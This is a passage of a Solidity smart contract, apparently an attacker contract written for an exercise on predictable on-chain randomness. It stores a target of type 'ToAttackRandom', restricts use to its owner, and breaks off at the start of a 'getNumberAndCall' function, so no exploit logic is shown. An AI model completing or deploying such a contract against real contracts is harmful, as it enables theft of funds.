    ToAttackRandom toAttack;
    address owner;

    modifier onlyOwner(){
        require(msg.sender == owner, "Caller is not the owner");
        _;
    }


    constructor(address payable _toAttackAddress){
        toAttack = ToAttackRandom(_toAttackAddress);
    }



    function getNumberAndCall()public onlyOwner{
